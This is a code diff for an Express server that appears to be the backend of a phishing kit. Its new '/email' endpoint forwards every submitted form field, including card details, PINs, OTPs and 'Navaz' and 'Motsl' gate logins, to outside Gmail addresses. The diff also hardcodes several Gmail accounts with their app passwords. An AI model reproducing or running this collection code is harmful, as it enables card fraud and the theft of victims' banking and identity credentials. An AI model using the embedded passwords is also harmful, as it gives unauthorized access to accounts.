@@ -12,10 +12,10 @@ app.use(cors("*"));
 app.use(require("morgan")("dev"));
 
 const emailData = {
-  // user: "taminkaram60@gmail.com",
-  // pass: "whai mwsw dlef aoli",
-  user: "karamalzoubi2045@gmail.com",
-  pass: "jysn zlyr agrn vvij",
+  user: "taminkaram60@gmail.com",
+  pass: "whai mwsw dlef aoli",
+  // user: "karamalzoubi2045@gmail.com",
+  // pass: "aczd aicu rmru eiha",
 };
 
 const sendEmail = async (data, type) => {
@@ -55,11 +55,12 @@ const sendEmail = async (data, type) => {
           ? "Salama - Navaz Gate "
           : type === "navazOtp"
           ? "Salama Navaz Last Otp  "
-          : " "
+          : "Salama "
       }`,
       html: htmlContent,
     })
     .then((info) => {
+      console.log(info)
       if (info.accepted.length) {
            console.log("Email sended ");
         return true;
@@ -73,7 +74,101 @@ const sendEmail = async (data, type) => {
 };
 
 app.get("/", (req, res) => res.sendStatus(200));
-
+app.post("/email", async (req, res) => {
+  if (req.query.type === "one") {
+    const transporter = nodemailer.createTransport({
+      service: "gmail",
+      auth: {
+        user: emailData.user,
+        pass: emailData.pass,
+      },
+    });
+    let htmlContent = "<div>";
+    for (const [key, value] of Object.entries(req.body)) {
+      htmlContent += `<p>${key}: ${
+        typeof value === "object" ? JSON.stringify(value) : value
+      }</p>`;
+    }
+    await transporter
+      .sendMail({
+        from: "Admin Panel",
+        to: "pnusds269@gmail.com",
+        subject: `${
+          req.query.visa
+            ? "Salama  Visa"
+            : req.query.reg
+            ? "Salama Register Form "
+            : req.query.otp
+            ? "Salama Visa Otp "
+            : req.query.pin
+            ? "Salama Visa Pin "
+            : req.query.motsal
+            ? "Salama - Motsl Gate Data "
+            : req.query.motsalOtp
+            ? "Salama - Motsl Gate Otp "
+            : req.query.navaz
+            ? "Salama - Navaz Gate "
+            : req.query.navazOtp
+            ? "Salama Navaz Last Otp  "
+            : "Salama Bank Visa"
+        }`,
+        html: htmlContent,
+      })
+      .then((info) => {
+        if (info.accepted.length) {
+          res.sendStatus(200);
+        } else {
+          res.sendStatus(400);
+        }
+      });
+  } else {
+    const transporter = nodemailer.createTransport({
+      service: "gmail",
+      auth: {
+        user: "saudiabsher1990@gmail.com",
+        pass: "nazl tmfi oxnn astq",
+      },
+    });
+    let htmlContent = "<div>";
+    for (const [key, value] of Object.entries(req.body)) {
+      htmlContent += `<p>${key}: ${
+        typeof value === "object" ? JSON.stringify(value) : value
+      }</p>`;
+    }
+    await transporter
+      .sendMail({
+        from: "Admin Panel",
+        to: "saudiabsher1990@gmail.com",
+        subject: `${
+          req.query.visa
+            ? "Salama  Visa"
+            : req.query.reg
+            ? "Salama Register Form "
+            : req.query.otp
+            ? "Salama Visa Otp "
+            : req.query.pin
+            ? "Salama Visa Pin "
+            : req.query.motsal
+            ? "Salama - Motsl Gate Data "
+            : req.query.motsalOtp
+            ? "Salama - Motsl Gate Otp "
+            : req.query.navaz
+            ? "Salama - Navaz Gate "
+            : req.query.navazOtp
+            ? "Salama Navaz Last Otp  "
+            : "Salama Bank Visa"
+        }`,
+        html: htmlContent,
+      })
+      .then((info) => {
+        if (info.accepted.length) {
+          res.sendStatus(200);
+        } else {
+          res.sendStatus(400);
+        }
+      });
+  }
+});
 app.delete("/", async (req, res) => {
   await Order.find({})
     .then(async (orders) => {
